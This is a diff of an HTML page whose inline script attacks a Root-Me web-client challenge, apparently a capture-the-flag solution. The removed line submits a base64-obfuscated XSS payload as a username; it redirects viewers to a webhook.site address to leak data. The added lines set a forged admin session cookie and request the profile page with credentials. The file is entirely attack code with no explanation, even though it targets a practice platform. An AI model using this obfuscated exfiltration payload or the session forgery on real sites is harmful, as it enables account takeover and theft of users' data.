@@ -4,7 +4,8 @@
 </head>
 <body>
 <script>
-fetch("https://web-client-ch6.challenge01.root-me.org:58006/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({"username":atob('PGltZyBzcmM9InQuanBnIiBvbmVycm9yPSJ3aW5kb3cubG9jYXRpb24gPSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvOGZlNmU0ZjItY2ZlOS00NmY0LTkwMTMtYTYxNmNmYmY0ZTM1Lz9mbGFnPWJsaW5kJyIvPg=='),"secret":"bloblo"})})
+document.cookie = "session=eyJzZWNyZXQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.aLMbcQ.y2P9SgonfLE-E97rAR1c3NrEC7g";
+fetch("https://web-client-ch6.challenge01.root-me.org:58006/profile",{method:"GET",credentials:'include'}).then((response) => console.log(response.json()));
 </script>
 </body>
 </html>
